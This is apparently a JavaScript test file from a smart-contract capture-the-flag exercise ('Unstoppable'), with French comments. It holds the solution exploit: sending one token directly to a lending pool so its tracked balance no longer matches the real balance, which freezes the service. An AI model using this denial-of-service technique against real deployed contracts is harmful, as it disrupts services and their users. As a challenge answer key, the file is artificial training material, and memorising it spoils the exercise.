/**
 * Exploit pour la vulnérabilité Unstoppable
 * 
 * Cette exploitation crée une incohérence entre le solde suivi et le solde réel
 * en envoyant des tokens directement au contrat, paralysant ainsi le service.
 */

it('Exploit', async function () {
    // Envoyer 1 token directement au contrat sans passer par depositTokens()
    // Cela crée un écart entre poolBalance et le solde réel du contrat
    console.log('Solde interne (poolBalance) avant:', (await this.pool.poolBalance()).toString());
    console.log('Solde réel avant:', (await this.token.balanceOf(this.pool.address)).toString());
    
    // L'attaque: transfert direct qui modifie le solde réel sans modifier poolBalance
    await this.token.transfer(this.pool.address, 1, { from: attacker });
    
    console.log('Solde interne (poolBalance) après:', (await this.pool.poolBalance()).toString());
    console.log('Solde réel après:', (await this.token.balanceOf(this.pool.address)).toString());
    console.log('Le système est désormais paralysé');
  });